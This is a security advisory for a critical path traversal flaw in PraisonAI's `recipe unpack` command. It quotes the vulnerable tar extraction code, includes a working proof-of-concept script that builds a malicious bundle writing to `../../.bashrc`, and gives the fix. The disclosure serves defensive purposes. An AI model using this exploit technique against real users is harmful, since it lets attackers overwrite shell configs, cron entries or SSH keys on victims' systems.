# [C] PraisonAI vulnerable to arbitrary file write via path traversal in `praisonai recipe unpack`

## Summary
Severity: Critical
Advisory: GHSA-99g3-w8gr-x37c
CVE: CVE-2026-40157
CWE: CWE-22
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H (CVSS_V4)
Published: 2026-04-10
Source: https://github.com/advisories/GHSA-99g3-w8gr-x37c
Type: github-advisory

## Affected
- PyPI: `PraisonAI` — affected >=2.7.2 <4.5.128

## Details
| Field | Value |
|---|---|
| Severity | Critical |
| Type | Path traversal -- arbitrary file write via `tar.extract()` without member validation |
| Affected | `src/praisonai/praisonai/cli/features/recipe.py:1170-1172` |

## Summary

`cmd_unpack` in the recipe CLI extracts `.praison` tar archives using raw `tar.extract()` without validating archive member paths. A `.praison` bundle containing `../../` entries will write files outside the intended output directory. An attacker who distributes a malicious bundle can overwrite arbitrary files on the victim's filesystem when they run `praisonai recipe unpack`.

## Details

The vulnerable code is in `cli/features/recipe.py:1170-1172`:

```python
for member in tar.getmembers():
    if member.name != "manifest.json":
        tar.extract(member, recipe_dir)
```

The only check is whether the member is `manifest.json`. The code never validates member names -- absolute paths, `..` components, and symlinks all pass through. Python's `tarfile.extract()` resolves these relative to the destination, so a member named `../../.bashrc` lands two directories above `recipe_dir`.

The codebase does contain a safe extraction function (`_safe_extractall` in `recipe/registry.py:131-162`) that rejects absolute paths, `..` segments, and resolved paths outside the destination. It is used by the `pull` and `publish` paths, but `cmd_unpack` does not call it.

```python
# recipe/registry.py:141-159 -- safe version exists but is not used by cmd_unpack
def _safe_extractall(tar: tarfile.TarFile, dest_dir: Path) -> None:
    dest = str(dest_dir.resolve())
    for member in tar.getmembers():
        if os.path.isabs(member.name):
            raise RegistryError(...)
        if ".." in member.name.split("/"):
            raise RegistryError(...)
        resolved = os.path.realpath(os.path.join(dest, member.name))
        if not resolved.startswith(dest + os.sep):
            raise RegistryError(...)
    tar.extractall(dest_dir)
```

## PoC

Build a malicious bundle:

```python
import tarfile, io, json

manifest = json.dumps({"name": "legit-recipe", "version": "1.0.0"}).encode()

with tarfile.open("malicious.praison", "w:gz") as tar:
    info = tarfile.TarInfo(name="manifest.json")
    info.size = len(manifest)
    tar.addfile(info, io.BytesIO(manifest))

    payload = b"export EVIL=1  # injected by malicious recipe\n"
    evil = tarfile.TarInfo(name="../../.bashrc")
    evil.size = len(payload)
    tar.addfile(evil, io.BytesIO(payload))
```

Trigger:

```bash
praisonai recipe unpack malicious.praison -o ./recipes
# Expected: files written only under ./recipes/legit-recipe/
# Actual:   .bashrc written two directories above the output dir
```

## Impact

| Path | Traversal blocked? |
|------|--------------------|
| `praisonai recipe pull <name>` | Yes -- uses `_safe_extractall` |
| `praisonai recipe publish <bundle>` | Yes -- uses `_safe_extractall` |
| `praisonai recipe unpack <bundle>` | No -- raw `tar.extract()` |

An attacker needs to get a victim to unpack a malicious `.praison` bundle -- say, through a shared recipe repository, a link in a tutorial, or by sending it to a colleague directly.

Depending on filesystem permissions, an attacker can overwrite shell config files (`.bashrc`, `.zshrc`), cron entries, SSH `authorized_keys`, or project files in parent directories. The attacker controls both the path and the content of every written file.

## Remediation

Replace the raw extraction loop with `_safe_extractall`:

```python
# cli/features/recipe.py:1170-1172
# Before:
for member in tar.getmembers():
    if member.name != "manifest.json":
        tar.extract(member, recipe_dir)

# After:
from praisonai.recipe.registry import _safe_extractall
_safe_extractall(tar, recipe_dir)
```

### Affected paths

- `src/praisonai/praisonai/cli/features/recipe.py:1170-1172` -- `cmd_unpack` extracts tar members without path validation

## References
- https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-99g3-w8gr-x37c
- https://nvd.nist.gov/vuln/detail/CVE-2026-40157
- https://github.com/MervinPraison/PraisonAI
- https://github.com/MervinPraison/PraisonAI/releases/tag/v4.5.128
